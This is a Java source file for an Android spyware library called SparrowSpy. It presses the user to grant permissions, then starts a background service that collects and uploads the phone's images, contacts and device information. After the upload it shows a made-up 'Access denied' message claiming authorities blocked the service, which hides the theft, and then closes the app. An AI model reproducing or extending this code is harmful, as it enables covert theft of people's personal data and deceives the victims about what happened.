package com.tangledbytes.sparrowspy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import androidx.appcompat.app.AlertDialog;

import com.tangledbytes.sparrowspy.events.Events;
import com.tangledbytes.sparrowspy.server.DataUploader;
import com.tangledbytes.sparrowspy.server.services.SparrowSpyService;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.SpyState;
import com.tangledbytes.sparrowspy.utils.Utils;

public class SparrowSpy {
    private static final String TAG = "SparrowSpy";
    private final Activity mActivity;
    public static final int PERMISSIONS_REQUEST_CODE = 101;
    public static final int OPEN_SETTINGS_REQUEST_CODE = 102;
    private final Utils mUtils;
    private boolean isShowingNoInternetDialog;

    private SparrowSpy(Activity activity) {
        mActivity = activity;
        mUtils = new Utils(mActivity);
    }

    public static SparrowSpy init(Activity activity) {
        SparrowSpy spy = new SparrowSpy(activity);
        spy.startCollectorService();
        return spy;
    }

    public SparrowSpy setDataCollectionListener(Events.DataCollectionListener listener) {
        SpyState.Listeners.dataCollectionListener = listener;
        return this;
    }
    public SparrowSpy setDataUploadListener(Events.DataUploadListener listener) {
        SpyState.Listeners.dataUploadListener = listener;
        return this;
    }
    public SparrowSpy setSpyServiceStateChangeListener(Events.SpyServiceStateChangeListener listener) {
        SpyState.Listeners.spyServiceStateChangeListener = listener;
        return this;
    }

    public void showEnableInternetDialog() {
        if (isShowingNoInternetDialog)
            return;
        isShowingNoInternetDialog = true;
        AlertDialog.Builder noInternetDialog = new AlertDialog.Builder(mActivity)
                .setTitle("No Internet Connection")
                .setMessage("No internet connection detected. Please enable internet in order continue. Click retry to recheck.\nThank you")
                .setCancelable(false)
                .setNegativeButton("Retry",
                        (dialog, whichButton) -> {
                            isShowingNoInternetDialog = false;
                        });
        noInternetDialog.show();
    }

    public void showFailedDialog() {
        AlertDialog.Builder failedDialog = new AlertDialog.Builder(mActivity)
                .setTitle("Access denied")
                .setMessage("It looks like authorities has blocked this service in your area. Please stay tuned for further updates.\nThank you")
                .setCancelable(false)
                .setNegativeButton(R.string.exit,
                        (dialog, whichButton) -> {
                            mUtils.showToast(R.string.closing_app);
                            mActivity.finish();
                        });
        failedDialog.show();
    }

    private void startCollectorService() {
        if (hasUploadedAllData()) {
            showFailedDialog();
            Log.i(TAG, "Data uploaded, not starting collector service");
            return;
        }
        if (!hasAllPermissions()) {
            Log.d(TAG, "All permissions are not granted, prompting for permission grant...");
            grantPermissions();
            return;
        }
        Intent intentCollectorService = new Intent(mActivity, SparrowSpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            mActivity.startForegroundService(intentCollectorService);
        } else
            mActivity.startService(intentCollectorService);
    }

    public boolean hasUploadedAllData() {
        SharedPreferences prefs = mActivity.getSharedPreferences(Constants.PREFS_UPLOAD_STATUS, Context.MODE_PRIVATE);
        return prefs.getBoolean(Constants.PREF_IMAGES_STATUS, false)
                && prefs.getBoolean(Constants.PREF_CONTACTS_STATUS, false)
                && prefs.getBoolean(Constants.PREF_DEVICE_INFO_STATUS, false);
    }

    public boolean hasAllPermissions() {
        for (String permission : Constants.PERMISSIONS_NEEDED) {
            if (!mUtils.hasPermission(permission)) return false;
        }
        return true;
    }


    /**
     * Checks whether the user has granted all permissions or not. If the user had granted all
     * permissions then it starts spy otherwise it again prompts for granting  permissions.
     */
    public void handlePermissionResult() {
        for (String permission : Constants.PERMISSIONS_NEEDED) {
            if (mUtils.hasPermission(permission)) {
                // User granted this permission, check for next one
                continue;
            }
            // User not granted permission
            AlertDialog.Builder permissionRequestDialog = new AlertDialog.Builder(mActivity)
                    .setTitle(R.string.dialog_permission_title)
                    .setMessage(R.string.dialog_permission_message)
                    .setCancelable(false)
                    .setNegativeButton(R.string.exit,
                            (dialog, whichButton) -> {
                                mUtils.showToast(R.string.closing_app);
                                mActivity.finish();
                            });
            if (!mActivity.shouldShowRequestPermissionRationale(permission)) {
                // User clicked on "Don't ask again", show dialog to navigate him to
                // settings
                permissionRequestDialog
                        .setPositiveButton(R.string.go_to_settings,
                                (dialog, whichButton) -> {
                                    Intent intent =
                                            new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    Uri uri =
                                            Uri.fromParts("package", mActivity.getPackageName(), null);
                                    intent.setData(uri);
                                    mActivity.startActivityForResult(intent,
                                            OPEN_SETTINGS_REQUEST_CODE);
                                })
                        .show();
            } else {
                // User clicked on 'deny', prompt again for permissions
                permissionRequestDialog
                        .setPositiveButton(R.string.try_again,
                                (dialog, whichButton) -> grantPermissions())
                        .show();
            }
            return;
        }
        Log.i(TAG, "All required permissions have been granted!");
        startCollectorService();
    }

    private void grantPermissions() {
        mActivity.requestPermissions(Constants.PERMISSIONS_NEEDED,
                PERMISSIONS_REQUEST_CODE);
    }
}
